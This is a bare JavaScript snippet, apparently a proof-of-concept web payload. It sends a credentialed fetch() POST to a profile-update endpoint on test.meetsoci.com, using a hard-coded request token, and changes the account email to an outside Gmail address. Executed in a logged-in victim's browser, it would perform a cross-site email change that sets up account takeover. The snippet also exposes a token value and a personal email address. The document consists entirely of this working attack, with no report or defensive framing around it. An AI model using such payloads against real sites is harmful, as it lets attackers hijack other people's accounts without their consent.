fetch('https://test.meetsoci.com/api/update_profile.json?request_token=ztBnadNMslYGXXxTqb4t', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
    },
    body: 'email=ddancer03@gmail.com',
    credentials: 'include'
});
